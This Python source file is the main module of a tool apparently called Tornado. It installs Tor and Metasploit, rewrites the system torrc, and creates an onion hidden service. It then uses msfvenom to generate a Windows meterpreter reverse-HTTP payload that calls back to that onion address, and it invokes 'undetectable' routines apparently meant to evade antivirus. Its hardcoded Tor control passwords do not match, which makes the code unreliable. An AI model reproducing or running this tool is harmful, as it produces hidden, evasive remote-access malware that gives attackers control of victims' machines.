# running main functions

import os
import signal
import subprocess
import sys
import argparse
from stem.control import Controller
from importlib.metadata import version
from tornado.core import logger
from tornado.core.logger import banner, info, warn, green, reset
from tornado.core import undetectable

class T0rnado():
    def __init__(self):
        self.samogod = ':x samet-g :x'
        self.version = version('tornado')

    def startup(self):
        print(banner)
        logger.info(f'Tornado Engine ({green}v{self.version}{reset}) is initialising.')
        if os.name == 'nt':
            logger.error('Tornado doesn\'t have Windows Support for now.')
            logger.error('Run it with WSL technology or Kali Linux machine.')
            logger.error('Any contributions you make are greatly appreciated especially Windows Integration to github.com/samet-g/tornado')
        else:
            logger.warn('Use with caution. You are responsible for your actions.')
            logger.warn('Developers assume no liability and are not responsible for any misuse or damage.')

    def install(self):
        tor = subprocess.call(['which', 'tor'], stdout=subprocess.PIPE)
        if tor:
            logger.info('Tor is downloading..')
            subprocess.run(['sudo', 'apt', 'update'], stdout=subprocess.PIPE)
            subprocess.run(['sudo', 'apt', 'install', 'tor'], stdout=subprocess.PIPE)
            logger.goodt('Tor is succesfully downloaded.')
        else:
            pass
        msfvenom = subprocess.call(['which', 'msfvenom'], stdout=subprocess.PIPE)
        if msfvenom:
            try:
                logger.info('Metasploit is downloading..')
                subprocess.run(['sudo', 'apt', 'update'], stdout=subprocess.PIPE)
                os.system('curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && sudo chmod 755 msfinstall && sudo./msfinstall')
                logger.goodt('Metasploit is succesfully downloaded.')
            except:
                logger.errort('Metasploit is not downloaded.\nTry install Metasploit to your system with manually.')
        else:
            pass
            
    def configure(self):
        password = 't0rnad0sam0g0d'
        logger.infot('ControlPort and HashedControlPassword is setting at /etc/tor/torrc file..')
        try:
            command = f"tor --hash-password {password}"
            result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, universal_newlines=True)
            hashed_password = result.stdout.split("\n")[1]
            with open("/etc/tor/torrc", "r") as file:
                lines = file.readlines()
            with open("/etc/tor/torrc", "w") as file:
                for line in lines:
                    if "ControlPort" not in line and "HashedControlPassword" not in line:
                        file.write(line)
                file.write(f"ControlPort 9051\nHashedControlPassword {hashed_password}\n")
        except:
            sys.exit(1)

    def connection(self):
        logger.infot('Tor connection is starting..')
        with Controller.from_port(port=9051) as controller:
            controller.authenticate(password='allah')
            logger.infot(f'Tor is running version {controller.get_version()}')
            logger.infot('Creating hidden service in hidden_service folder..')
            hidden_service = os.path.join(controller.get_conf('DataDirectory', os.getcwd()), 'hidden_service')
            result = controller.create_hidden_service(path=hidden_service, port=80, target_port=1235)
            if result and result.hostname:
                logger.good(f'Service is available at {result.hostname}')
                tor2web = result.hostname + ".re"
                self.shell(tor2web)
            else:
                logger.error('Failed to create a hidden service. Please check Tor configuration and logs.')

    def shell(self, host):
        payload = "http"

        logger.input('Enter arch: [x86--x64] [default: x64]')
        arch = input()
        arch = arch or "x64"

        logger.infot(f'Payload: {payload}')
        logger.infot(f'Arch: {arch}')
        logger.infot(f'Onion Address: {host}:80')

        logger.infot('Generating payload..')

        if arch == "x64":
            os.system(
                f"/usr/bin/msfvenom -p windows/x64/meterpreter_reverse_{payload} LHOST={host} LPORT=80 EXITFUNC=process --platform windows -a {arch} -f raw -o tornado.raw")

        if arch == "x86":
            os.system(
                f"/usr/bin/msfvenom -p windows/meterpreter_reverse_{payload} LHOST={host} LPORT=80 --platform windows -a x86 -f raw -o tornado.raw")

    def process(self):
        self.startup()
        self.install()
        try:
            self.configure()
        except:
            pass
        self.connection() # + self.shell(tor2web)
        undetectable.slayer()
        undetectable.compile()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-start", "--start", action='store_true',
                              help="start tornado: `sudo tornado -start`"),
    args = parser.parse_args()

    def check_privileges():
        if not os.environ.get("SUDO_UID") and os.geteuid() != 0:
            print(banner)
            logger.errort('You need to run tornado with sudo or as root.')

    if args.start:
        if check_privileges():
            sys.exit(1)
        else:
            tornado = T0rnado()
            tornado.process()
    else:
        print(banner)
        parser.print_help()
